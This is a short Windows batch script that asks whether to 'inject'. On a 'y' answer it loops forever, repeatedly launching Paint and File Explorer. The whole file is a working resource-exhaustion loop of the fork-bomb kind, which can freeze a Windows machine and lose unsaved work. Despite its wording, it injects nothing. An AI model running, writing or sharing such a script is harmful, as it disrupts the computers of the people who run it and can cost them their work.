@echo off
set /p choice=Do you want to inject? (y/n): 
if /i "%choice%"=="y" (
    :loop
    start mspaint
    start explorer
    goto loop
)
